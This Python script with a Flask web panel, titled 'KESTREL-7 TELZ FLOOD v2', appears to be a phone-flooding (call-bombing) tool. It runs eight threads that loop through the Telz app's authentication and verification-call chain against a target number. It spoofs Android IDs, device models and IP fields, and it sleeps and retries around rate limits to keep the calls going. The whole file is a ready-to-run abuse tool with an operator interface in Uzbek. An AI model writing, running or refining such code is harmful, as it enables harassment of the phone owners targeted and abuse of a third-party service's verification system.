#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KESTREL-7 — TELZ FLOOD v2 (Multi‑thread + Full Auth Chain)
"""
import threading
import time
import uuid
import json
import random
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
from waitress import serve

# ---------- CONFIG ----------
WORKERS = 8                     # concurrent threads
BASE_URL = "https://api.telz.com/"
HEADERS = {
    'User-Agent': 'Telz-Android/17.5.33',
    'Accept-Encoding': 'gzip',
    'Content-Type': 'application/json; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Accept-Language': 'uz-UZ,uz;q=0.9'
}
DEFAULT_PHONE = "+998901234567"

# ---------- STATE ----------
flood_active = False
flood_threads = []
log_lines = []
lock = threading.Lock()
active_workers = 0

def append_log(msg):
    with lock:
        ts = datetime.now().strftime('%H:%M:%S')
        log_lines.append(f"[{ts}] {msg}")
        if len(log_lines) > 200:
            log_lines.pop(0)

def format_phone(raw):
    digits = ''.join(c for c in raw if c.isdigit())
    if digits.startswith('998'):
        digits = digits[3:]
    elif digits.startswith('+998'):
        digits = digits[4:]
    if len(digits) not in (8,9):
        raise ValueError(f"Invalid length: {len(digits)}")
    return f"+998{digits}"

# ---------- TELZ ENGINE (Per‑worker) ----------
class TelzWorker:
    def __init__(self, phone):
        self.phone = phone
        self.android_id = uuid.uuid4().hex[:16]
        self.session_id = str(uuid.uuid4())
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.run_id = None
        self.auth_token = None

    def _post(self, endpoint, data):
        url = BASE_URL + endpoint
        data.update({
            'android_id': self.android_id,
            'app_version': '17.5.33',
            'os': 'android',
            'os_version': '15',
            'ts': int(time.time()*1000),
            'uuid': self.session_id
        })
        resp = self.session.post(url, json=data, timeout=12)
        resp.raise_for_status()
        return resp.json()

    def auth_list(self):
        return self._post('app/auth_list', {'event':'auth_list'})

    def run_app(self):
        resp = self._post('app/run', {
            'event':'run',
            'device_name': self._random_device(),
            'ipv4_address': f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
            'ipv6_address': 'FE80::' + uuid.uuid4().hex[:4],
            'lang':'uz',
            'network_country':'uz',
            'network_type': random.choice(['4G','5G','WiFi']),
            'roaming':'no',
            'root':'no',
            'run_id':'',
            'sim_country':'uz'
        })
        self.run_id = resp.get('run_id', '')
        return resp

    def stat_btns(self):
        return self._post('app/stat_btns', {'event':'stat_btns','btn':'on_reg_continue'})

    def validate_phone(self):
        return self._post('app/validate_phonenumber', {'event':'validate_phonenumber','phone':self.phone,'region':'UZ'})

    def auth_call(self):
        return self._post('app/auth_call', {
            'event':'auth_call',
            'phone':self.phone,
            'attempt': str(random.randint(0,3)),
            'lang':'uz',
            'run_id': self.run_id or ''
        })

    def _random_device(self):
        brands = ['Samsung','Xiaomi','OnePlus','Google','Huawei','Realme','Oppo']
        models = ['SM-G998B','Mi 11','NE2213','Pixel 6','Mate 40','RMX3360','CPH2249']
        return f"{random.choice(brands)} {random.choice(models)}"

    def full_cycle(self):
        """Execute full auth + call. Returns (status, error_msg)."""
        try:
            self.auth_list()
            self.run_app()
            self.stat_btns()
            val = self.validate_phone()
            if val.get('status') != 'ok':
                return (val.get('status'), None)
            call = self.auth_call()
            status = call.get('status', 'unknown')
            return (status, None)
        except Exception as e:
            return (None, str(e)[:80])

# ---------- WORKER LOOP ----------
def worker_loop(phone):
    global flood_active, active_workers
    consecutive_fail = 0
    while flood_active:
        worker = TelzWorker(phone)
        status, err = worker.full_cycle()
        if status:
            append_log(f"📞 {phone} → {status}")
            if status == 'ok':
                consecutive_fail = 0
                delay = random.uniform(8, 18)
            elif status == 'not_allowed':
                consecutive_fail += 1
                if consecutive_fail >= 3:
                    append_log(f"⚠️ {phone} not_allowed x3 – stopping worker.")
                    break
                delay = random.uniform(20, 35)
            elif status in ('try_again_later', 'rate_limit'):
                consecutive_fail += 1
                if consecutive_fail >= 5:
                    append_log(f"⚠️ {phone} rate‑limit – stopping worker.")
                    break
                delay = random.uniform(30, 60)
            else:
                delay = random.uniform(10, 25)
        else:
            append_log(f"⚠️ {phone} error: {err}")
            delay = 5
        time.sleep(delay)
    with lock:
        active_workers -= 1
    append_log(f"⛔ Worker stopped for {phone}")

def start_flood(phone):
    global flood_active, flood_threads, active_workers
    if flood_active:
        return False
    flood_active = True
    active_workers = WORKERS
    for _ in range(WORKERS):
        t = threading.Thread(target=worker_loop, args=(phone,), daemon=True)
        t.start()
        flood_threads.append(t)
        time.sleep(0.3)  # stagger starts
    append_log(f"🚀 FLOOD BOSHLANDI: {phone} (8 threads)")
    return True

def stop_flood():
    global flood_active
    flood_active = False
    # threads will exit on their own
    append_log("⛔ FLOOD TO'XTATILDI")
    return True

# ---------- FLASK APP ----------
app = Flask(__name__)

HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KESTREL-7 · TELZ FLOOD v2</title>
    <style>
        body{background:#0a0a1a;color:#0f0;font-family:'Courier New',monospace;padding:20px;}
        .container{max-width:600px;margin:auto;}
        h1{color:#0ff;text-shadow:0 0 10px#0ff;}
        .dev{color:#f80;font-size:14px;}
        input,button{padding:14px;font-size:18px;border:none;border-radius:10px;width:100%;margin:5px 0;}
        input{background:#222;color:#0f0;}
        .btn-start{background:#0f0;color:#000;font-weight:bold;cursor:pointer;}
        .btn-stop{background:#f00;color:#fff;font-weight:bold;cursor:pointer;}
        #log{background:#111;padding:10px;height:350px;overflow-y:scroll;border:1px solid#0f0;white-space:pre-wrap;font-size:12px;}
        .info{color:#aaa;}
        .flex{display:flex;gap:10px;}
        .flex button{flex:1;}
    </style>
</head>
<body>
<div class="container">
    <h1>⚡ KESTREL-7 v2</h1>
    <p class="dev">👨‍💻 Developer: @wulox</p>
    <p class="info">Boshlash — 8 ta parallel flood ishga tushadi. To'xtatish — barcha floodlarni to'xtatadi.</p>
    <input id="phone" placeholder="998901234567" value="{{ default_phone }}">
    <div class="flex">
        <button id="startBtn" class="btn-start">🚀 BOSHLASH</button>
        <button id="stopBtn" class="btn-stop">⛔ TO'XTAT</button>
    </div>
    <div id="log">⏳ Yuklanmoqda...</div>
</div>
<script>
const logDiv=document.getElementById('log');
const startBtn=document.getElementById('startBtn');
const stopBtn=document.getElementById('stopBtn');
const phoneInput=document.getElementById('phone');

function fetchLog(){
    fetch('/logs')
    .then(r=>r.text())
    .then(data=>{ logDiv.textContent=data; logDiv.scrollTop=logDiv.scrollHeight; })
    .catch(console.error);
}
setInterval(fetchLog,800);

startBtn.onclick=()=>{
    const phone=phoneInput.value.trim();
    if(!phone) return alert('Raqam kiriting');
    fetch('/start',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+encodeURIComponent(phone)})
    .then(r=>r.json())
    .then(d=>alert(d.status));
};
stopBtn.onclick=()=>{
    fetch('/stop',{method:'POST'})
    .then(r=>r.json())
    .then(d=>alert(d.status));
};
fetchLog();
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML, default_phone=DEFAULT_PHONE)

@app.route('/logs')
def get_logs():
    with lock:
        return '\n'.join(log_lines[-100:]) or 'Tayyor...'

@app.route('/start', methods=['POST'])
def start():
    phone_raw = request.form.get('phone', '').strip()
    try:
        phone = format_phone(phone_raw)
    except Exception as e:
        return jsonify({'status': f'XATO: {e}'})
    if start_flood(phone):
        return jsonify({'status': f'✅ BOSHLANDI: {phone} (8 threads)'})
    else:
        return jsonify({'status': '⚠️ ALLAQACHON ISHLYAPTI'})

@app.route('/stop', methods=['POST'])
def stop():
    stop_flood()
    return jsonify({"status": "⛔ TO'XTATISH SO'RALDI"})

# ---------- SELF‑PING (keep alive) ----------
def self_ping():
    while True:
        time.sleep(180)
        try:
            requests.get('http://localhost:8080')
        except:
            pass

# ---------- MAIN ----------
if __name__ == '__main__':
    threading.Thread(target=self_ping, daemon=True).start()
    serve(app, host='0.0.0.0', port=8080, threads=12)